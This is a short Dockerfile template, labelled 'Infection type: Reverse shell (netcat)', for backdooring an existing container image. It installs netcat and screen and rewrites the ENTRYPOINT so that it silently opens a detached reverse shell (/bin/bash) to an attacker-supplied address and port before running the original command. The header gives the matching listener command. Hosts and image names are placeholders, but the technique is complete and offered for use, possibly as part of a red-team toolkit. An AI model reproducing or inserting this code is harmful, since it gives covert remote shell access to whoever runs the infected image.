#### Description ############################################################################
# Infection type:  Reverse shell (netcat)
# Distribution:    Ubuntu
# Listener:        rlwrap -cAr nc -lvnp <listening_port>
####

FROM <name_of_image_to_infect>

RUN apt-get update && apt-get install screen netcat-traditional -y
ENTRYPOINT screen -d -m /bin/nc.traditional -c /bin/bash <listening_address> <listening_port> && <original_ENTRYPOINT_command> <original_CMD_command>
